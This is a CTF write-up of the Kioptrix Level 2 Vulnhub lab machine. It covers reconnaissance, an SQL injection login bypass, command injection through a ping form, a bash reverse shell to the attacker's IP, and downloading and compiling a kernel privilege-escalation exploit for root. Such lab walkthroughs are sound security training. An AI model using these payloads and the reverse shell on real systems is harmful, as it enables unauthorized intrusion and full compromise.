---
title: Kioptrix Level 2 - Vulnhub VM Challenge
author: 47Suriya
author_url: https://twitter.com/_47Suriya_
categories: 
 - Vulnhub
tags:
 - Vulnhub
 - Write up
 - Kioptrix Level 2
 - Kioptrix 
 - VM Challenge
---

---
# Kioptrix Level 2 - Vulnhub VM Challenge

## Description
This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
<br>


## Finding the IP of the Target Machine

The IP of the target machine is found by using [Netdiscover tool](https://github.com/alexxy/netdiscover).

Here I got the IP of the vulnerable machine as **192.168.0.170**
## Initial Scan 

First, [Nmap scanner](https://github.com/nmap/nmap) is used to find all the open ports and services running. 
After the scan we can see that there is MySQL running on port 3306. From that we can
assume that this site is connected to a database.

## SQL and Command Injection

When we navigate to the site hosted by the VM, we get a login page which consists of user and
password input fields. Here we can try to login using SQL Injection.
When we enter 1' or '1'='1 on both username and password it will alter the SQL query in a way
that it returns true for both the input fields. Then we can move on to a console which pings the
input entered. Here we can try using command injection and it works i.e we can terminate the
ping command using ‘ ; ‘ and continue to enter commands and execute. By taking advantage of
this command injection vulnerability we can invoke a reverse shell. <br> To create it, first we start a
netcat listener on attackers machine. 
```bash
nc -nlvp 555
```
Enter the payload below in the input field to create a reverse shell
```bash
bash -i >& /dev/tcp/192.168.1.120/555 0>&1 
```

After connecting to the victims machine, we check the Linux version that the machine is running
on using the command below. 
```bash
cat /proc/version
```
Version:
```bash
Linux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8))
```
## Exploit

Next we search about the linux version and we can find that there is a **Privilege
Escalation** [Exploit](https://www.exploit-db.com/exploits/9542).<br>
After downloading this exploit we can find that it is a c file and from the reverse shell we can find
out there is a gcc compiler present. So what we have to do is we have to move that exploit file to
the victims machine. Then we have to move the exploit file to the web root directory
```bash 
var/www/html 
``` 
Then start an apache server
```bash
service apache2 start 
```
Then we have to move to **/tmp** directory in the
reverse shell and get the contents by connecting to the attackers machine using **wget**
command to get the exploit file. Then we have to compile the exploit file 
```bash
gcc exploit.c -o exploit
```
Then finally we get root access by running the executable file <3